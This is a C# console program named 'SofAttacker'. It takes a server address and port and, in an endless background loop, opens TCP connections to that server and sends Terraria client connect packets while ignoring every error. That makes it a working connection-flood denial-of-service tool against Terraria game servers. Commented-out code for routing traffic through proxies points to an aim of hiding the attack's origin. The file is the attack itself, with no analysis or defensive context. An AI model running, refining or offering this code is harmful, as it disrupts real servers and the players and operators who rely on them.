using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SofAttacker
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //var pool = new ProxyPool();
            //pool.GetProxysFromAPIs();
            Console.WriteLine("Please enter the server address");
            var addr = Console.ReadLine();
            IPAddress path;
            if (!IPAddress.TryParse(addr, out path))
                path = Dns.GetHostEntry(addr).AddressList[0];
            Console.WriteLine("Please enter the server port");
            int port = int.Parse(Console.ReadLine());
            Console.WriteLine("Send connect request?(yes/no)");
            bool notSend = Console.ReadLine() == "no";
            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        //var socket = new TcpClient();
                        //Utils.Connect(socket, new IPEndPoint(path.AddressList[0], port), new IPEndPoint(IPAddress.Parse("120.24.76.81"),8123));
                        socket.Connect(new IPEndPoint(path, port));
                        if (notSend)
                            continue;
                        {
                            var data = new MemoryStream();
                            using (BinaryWriter wr = new BinaryWriter(data))
                            {
                                wr.Write((short)0);
                                wr.Write((byte)1);
                                wr.Write("Terraria248");
                                wr.BaseStream.Position = 0;
                                wr.Write((short)wr.BaseStream.Length);
                            }
                            socket.Send(data.ToArray());
                            var buffer = new byte[5];
                            socket.Receive(buffer);
                            Console.WriteLine(buffer[3]);
                            Console.WriteLine("sent");
                        }
                    }
                    catch { }
                }
            })
            { IsBackground = true }.Start();
            Console.ReadLine();
        }
    }
}
